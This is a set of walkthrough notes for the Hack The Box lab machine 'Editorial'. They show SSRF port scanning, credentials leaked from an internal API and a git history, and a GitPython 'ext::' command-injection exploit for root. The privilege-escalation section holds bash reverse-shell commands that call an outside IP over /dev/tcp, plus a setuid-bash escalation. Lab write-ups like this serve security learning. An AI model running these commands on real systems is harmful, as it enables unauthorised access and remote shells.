- nmap revealed http and tcp port.
- http running nginx
- vi /etc/hosts to add editorial.htb
- tried dirbuster, dirsearch and gobuster but got nothing.
- we see a place for user input and on burp suite we catch the request.
- can upload file but it does nothing (returns an image)
- but we see a location to enter a url
- so with netcat listening on a port we put our ip and port there
- we get a response so we know it is vulnerable to server side request forgery (SSRF)
- we enumerate the localhost port 80 to see if any local websites. we dont get much but we can brute force and check
- send to intrude and select the IP region and use /usr/share/seclists/DNS/Discovery/Infrastructure/common http proxies wordlist.
- we notice one response that is slightly different a returns something other than the image
- alternatively (and also burp suite is slower for this brute force) we can use ffuf.
- copy the request with the ip and the port number listed like this :
```
127.0.0.1:FUZZ
```

- and pass the command :

```
ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fr "jpeg" # or -fs 62 since that was the default size
```

- we get a file which when passing file command we know its a JSON file. Can use jq to make it more readable

```
cat <file_name> | jq .
```

- this file shos different endpoints which we can try to access with our SSRF. We end up finding another file in this endpoint:
```
/api/latest/metadata/messages/authors
```

- so we added this url in our SSRF exploit :

```
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

- we receive a file:
- we find the credentials of dev in the output

```
Username: dev
Password: dev080217_devAPI!@
```

- can ssh into machine with this credentials and get user flag.

## Lateral Movement
- looking at the file where user flag is we see a folder apps.
- looking into it and passing ls -al we see a hidden .git repository
- can enumerate with git

```
git status # shows some files were deleted
git logs
```

- alternatively I read the file logs and noted a "Downgrading prod to dev"
- i also check /etc/passwd for prod and see he is a user.
- furthermore since sudo -l didnt work maybe this prod user could have something we could run as root to get root access
- pased git show on the commit id in the log to see what was changed and from there we find prods credentials were deleted.

```
Username: prod
Password: 080217_Producti0n_2023!@
```

- logging into prod with su, we check sudo -l to see there is a command we could run:
```
/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
- we also see the env_reset and secure path has been set so the user is quite secure
- we read the file clone_prod_change.py:

```
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
	
- we see the intput argument to pass some command.
- the main thing to catch is 

```
from git import Repo
```

- on checking for exploits we find one with the following exploit:

```
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```
- we see that when 'ext::sh -c' is passed we can  get some kind of RCE.
- on passing this command as an argument we find that it created /tmp/pwned file showing that this is being exploited. I didn't do this but you can do to test.
- we attempt to input our IP and port to get a reverse shell. 

```
echo "bash -i >& /dev/tcp/10.10.14.25/9998 0>&1" >/tmp/pwned
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/pwned'
```
- while i listened on the port
- **alternatively you can pass the command directly instead of creating /tmp/pwned**

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% -c% "bash% -i% >&% /dev/tcp/10.10.14.25/9999% 0>&1"'
```

- we input this command as exploit but add % wherever there is a space:

```
ash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'
```
	
- **IPPSec Alternate**
- we find the location of bash with which bash command and copy it to /tmp
- we then use our exploit to give it root ownership and add a setuid bit so we can execute it.

```
which bash #/usr/bin/bash
cp /usr/bin/bash /tmp
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chown% root:root% /tmp/bash'
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% 4755% /tmp/bash' # gives it the setuid bit
```
		
- finally we privilege escalate with :

```
/tmp/bash -p # without -p it won't give root shell as bash inbuilt security lowers privileges of setuid executables unless specified
```
	
- we gain root access

-------
## Python code to brute force ports
- code:

```
#!/usr/bin/python3
import requests
with open("a", 'wb') as f:
f.write(b'')
for port in range(1, 65535):
with open("a", 'rb') as file:
data_post = {"bookurl": f"http://127.0.0.1:{port}"}
data_file = {"bookfile": file}
try:
r = requests.post("http://editorial.htb/upload-cover",
files=data_file, data=data_post)
if not r.text.strip().endswith('.jpeg'):
print(f"{port} --- {r.text}")
except requests.RequestException as e:
print(f"Error on port {port}: {e}")
```



